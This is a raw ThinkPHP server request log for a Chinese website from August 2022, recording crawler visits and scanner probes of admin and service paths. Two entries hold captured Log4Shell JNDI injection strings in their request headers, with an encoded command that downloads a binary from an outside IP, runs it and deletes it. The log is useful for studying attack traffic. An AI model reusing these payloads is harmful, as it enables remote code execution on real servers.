  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.26(0x18001a2d) NetType/WIFI Language/zh_CN',
  'upgrade-insecure-requests' => '1',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'host' => 'ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.000785s ]
[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/ywscs.com/application/admin/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /www/wwwroot/ywscs.com/public/../application/admin/view/login/index.html [ array (
  0 => 'webconfig',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000192s ] mysql:host=localhost;port=3306;dbname=ywscs_com;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sp_config` [ RunTime:0.000586s ]
[ sql ] [ SQL ] SELECT `ename`,`value` FROM `sp_config` WHERE  `ca_id` IN (1,2,4,5,10,15) [ RunTime:0.000195s ]
---------------------------------------------------------------
[ 2022-08-10T10:18:16+08:00 ] 192.241.219.171 GET 114.116.100.177/actuator/health
[运行时间：0.015284s] [吞吐率：65.43req/s] [内存消耗：1,700.66kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000021s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'actuator',
    1 => 'health',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T10:22:41+08:00 ] 192.241.235.251 GET 114.116.100.177/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f
[运行时间：0.014792s] [吞吐率：67.60req/s] [内存消耗：1,701.23kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'owa',
    1 => 'auth',
    2 => 'logon.aspx',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'url' => 'https://1/ecp/',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T10:28:03+08:00 ] 207.46.13.176 GET ywscs.com/
[运行时间：0.017386s] [吞吐率：57.52req/s] [内存消耗：2,069.88kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000023s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T10:28:50+08:00 ] 174.138.61.44 GET 114.116.100.177/
[运行时间：0.016393s] [吞吐率：61.00req/s] [内存消耗：2,067.75kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.0.0;) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T10:28:51+08:00 ] 174.138.61.44 GET 114.116.100.177/admin/login/index.html
[运行时间：0.023901s] [吞吐率：41.84req/s] [内存消耗：2,857.94kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'referer' => 'https://114.116.100.177/',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.0.0;) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.000801s ]
[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/ywscs.com/application/admin/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /www/wwwroot/ywscs.com/public/../application/admin/view/login/index.html [ array (
  0 => 'webconfig',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000483s ] mysql:host=localhost;port=3306;dbname=ywscs_com;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sp_config` [ RunTime:0.000587s ]
[ sql ] [ SQL ] SELECT `ename`,`value` FROM `sp_config` WHERE  `ca_id` IN (1,2,4,5,10,15) [ RunTime:0.000200s ]
---------------------------------------------------------------
[ 2022-08-10T10:39:36+08:00 ] 20.118.133.148 GET 114.116.100.177/
[运行时间：0.018203s] [吞吐率：54.94req/s] [内存消耗：2,073.78kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'x-api-version' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//20.111.17.179:443/TomcatBypass/Command/Base64/d2dldCAtbmMgaHR0cDovLzIwLjIwNi43OS4xOC9tYWlubGQgLXEgLVAgL3RtcC87IGNobW9kIDc3NyAvdG1wL21haW5sZDsgL3RtcC9tYWlubGQ7IHJtIC1yZiAvdG1wL21haW5sZA==}\')',
  'referer' => 'http://114.116.100.177:443/',
  'cookie' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//20.111.17.179:443/TomcatBypass/Command/Base64/d2dldCAtbmMgaHR0cDovLzIwLjIwNi43OS4xOC9tYWlubGQgLXEgLVAgL3RtcC87IGNobW9kIDc3NyAvdG1wL21haW5sZDsgL3RtcC9tYWlubGQ7IHJtIC1yZiAvdG1wL21haW5sZA==}\')',
  'connection' => 'close',
  'user-agent' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//20.111.17.179:443/TomcatBypass/Command/Base64/d2dldCAtbmMgaHR0cDovLzIwLjIwNi43OS4xOC9tYWlubGQgLXEgLVAgL3RtcC87IGNobW9kIDc3NyAvdG1wL21haW5sZDsgL3RtcC9tYWlubGQ7IHJtIC1yZiAvdG1wL21haW5sZA==}\')',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T10:39:37+08:00 ] 20.118.133.148 GET 114.116.100.177/admin/login/index.html
[运行时间：0.024143s] [吞吐率：41.42req/s] [内存消耗：2,864.81kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000019s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'x-api-version' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//20.111.17.179:443/TomcatBypass/Command/Base64/d2dldCAtbmMgaHR0cDovLzIwLjIwNi43OS4xOC9tYWlubGQgLXEgLVAgL3RtcC87IGNobW9kIDc3NyAvdG1wL21haW5sZDsgL3RtcC9tYWlubGQ7IHJtIC1yZiAvdG1wL21haW5sZA==}\')',
  'referer' => 'https://114.116.100.177/',
  'cookie' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//20.111.17.179:443/TomcatBypass/Command/Base64/d2dldCAtbmMgaHR0cDovLzIwLjIwNi43OS4xOC9tYWlubGQgLXEgLVAgL3RtcC87IGNobW9kIDc3NyAvdG1wL21haW5sZDsgL3RtcC9tYWlubGQ7IHJtIC1yZiAvdG1wL21haW5sZA==}\')',
  'connection' => 'close',
  'user-agent' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//20.111.17.179:443/TomcatBypass/Command/Base64/d2dldCAtbmMgaHR0cDovLzIwLjIwNi43OS4xOC9tYWlubGQgLXEgLVAgL3RtcC87IGNobW9kIDc3NyAvdG1wL21haW5sZDsgL3RtcC9tYWlubGQ7IHJtIC1yZiAvdG1wL21haW5sZA==}\')',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.000886s ]
[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/ywscs.com/application/admin/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /www/wwwroot/ywscs.com/public/../application/admin/view/login/index.html [ array (
  0 => 'webconfig',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000216s ] mysql:host=localhost;port=3306;dbname=ywscs_com;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sp_config` [ RunTime:0.000570s ]
[ sql ] [ SQL ] SELECT `ename`,`value` FROM `sp_config` WHERE  `ca_id` IN (1,2,4,5,10,15) [ RunTime:0.000223s ]
---------------------------------------------------------------
[ 2022-08-10T10:50:25+08:00 ] 185.181.102.18 GET 114.116.100.177/
[运行时间：0.018039s] [吞吐率：55.44req/s] [内存消耗：2,067.95kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'host' => '114.116.100.177',
  'accept-encoding' => 'identity',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T10:50:25+08:00 ] 185.181.102.18 GET 114.116.100.177/admin/login/index.html
[运行时间：0.023982s] [吞吐率：41.70req/s] [内存消耗：2,857.86kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'host' => '114.116.100.177',
  'accept-encoding' => 'identity',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.000826s ]
[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/ywscs.com/application/admin/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /www/wwwroot/ywscs.com/public/../application/admin/view/login/index.html [ array (
  0 => 'webconfig',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000277s ] mysql:host=localhost;port=3306;dbname=ywscs_com;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sp_config` [ RunTime:0.000586s ]
[ sql ] [ SQL ] SELECT `ename`,`value` FROM `sp_config` WHERE  `ca_id` IN (1,2,4,5,10,15) [ RunTime:0.000210s ]
---------------------------------------------------------------
[ 2022-08-10T10:50:42+08:00 ] 185.181.102.18 GET 114.116.100.177/robots.txt
[运行时间：0.014570s] [吞吐率：68.63req/s] [内存消耗：1,699.97kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'robots.txt',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T10:50:44+08:00 ] 185.181.102.18 GET 114.116.100.177/sitemap.xml
[运行时间：0.014735s] [吞吐率：67.87req/s] [内存消耗：1,699.97kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sitemap.xml',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T10:50:50+08:00 ] 185.181.102.18 GET 114.116.100.177/favicon.ico
[运行时间：0.014510s] [吞吐率：68.92req/s] [内存消耗：1,701.30kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'favicon.ico',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'keep-alive',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T11:07:06+08:00 ] 192.241.219.63 GET 114.116.100.177/
[运行时间：0.017734s] [吞吐率：56.39req/s] [内存消耗：2,067.19kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T11:34:29+08:00 ] 207.46.13.176 GET ywscs.com/
[运行时间：0.017442s] [吞吐率：57.33req/s] [内存消耗：2,069.88kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T11:34:39+08:00 ] 207.46.13.176 GET ywscs.com/admin/login/index.html
[运行时间：0.026087s] [吞吐率：38.33req/s] [内存消耗：2,861.43kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000018s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'PHPSESSID=3gugnc4ifqe5oud1n3atlgvulo; path=/',
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.000797s ]
[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/ywscs.com/application/admin/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /www/wwwroot/ywscs.com/public/../application/admin/view/login/index.html [ array (
  0 => 'webconfig',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000210s ] mysql:host=localhost;port=3306;dbname=ywscs_com;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sp_config` [ RunTime:0.000615s ]
[ sql ] [ SQL ] SELECT `ename`,`value` FROM `sp_config` WHERE  `ca_id` IN (1,2,4,5,10,15) [ RunTime:0.000220s ]
---------------------------------------------------------------
[ 2022-08-10T12:18:37+08:00 ] 192.241.221.137 GET 114.116.100.177/ReportServer
[运行时间：0.014823s] [吞吐率：67.46req/s] [内存消耗：1,700.55kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ReportServer',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T12:37:41+08:00 ] 109.248.6.5 GET /favicon.ico
[运行时间：0.014335s] [吞吐率：69.76req/s] [内存消耗：1,700.17kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000018s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'favicon.ico',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'user-agent' => 'masscan-ng/1.3 (https://github.com/bi-zone/masscan-ng)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T12:51:00+08:00 ] 192.241.222.249 GET 114.116.100.177/login
[运行时间：0.015280s] [吞吐率：65.44req/s] [内存消耗：1,700.53kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'login',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T15:55:24+08:00 ] 207.46.13.176 GET www.ywscs.com/
[运行时间：0.018605s] [吞吐率：53.75req/s] [内存消耗：2,069.95kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000018s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'www.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T16:02:40+08:00 ] 34.76.158.233 GET 114.116.100.177/
[运行时间：0.016817s] [吞吐率：59.46req/s] [内存消耗：2,070.22kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'x-datadog-sampling-priority' => '0',
  'x-datadog-parent-id' => '9801482680358399547',
  'x-datadog-trace-id' => '2072860154970678568',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.28.1',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T16:35:10+08:00 ] 17.121.113.207 GET www.ywscs.com/robots.txt
[运行时间：0.015132s] [吞吐率：66.09req/s] [内存消耗：1,701.70kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000018s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'robots.txt',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)',
  'host' => 'www.ywscs.com',
  'accept-encoding' => 'gzip,identity',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T16:35:10+08:00 ] 17.121.113.207 GET www.ywscs.com/
[运行时间：0.017458s] [吞吐率：57.28req/s] [内存消耗：2,068.33kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)',
  'host' => 'www.ywscs.com',
  'accept-encoding' => 'gzip,identity',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T16:35:11+08:00 ] 17.121.113.207 GET www.ywscs.com/admin/login/index.html
[运行时间：0.024867s] [吞吐率：40.21req/s] [内存消耗：2,858.11kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)',
  'host' => 'www.ywscs.com',
  'accept-encoding' => 'gzip,identity',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.000812s ]
[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/ywscs.com/application/admin/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /www/wwwroot/ywscs.com/public/../application/admin/view/login/index.html [ array (
  0 => 'webconfig',
) ]
[ info ] [ LOG ] INIT File
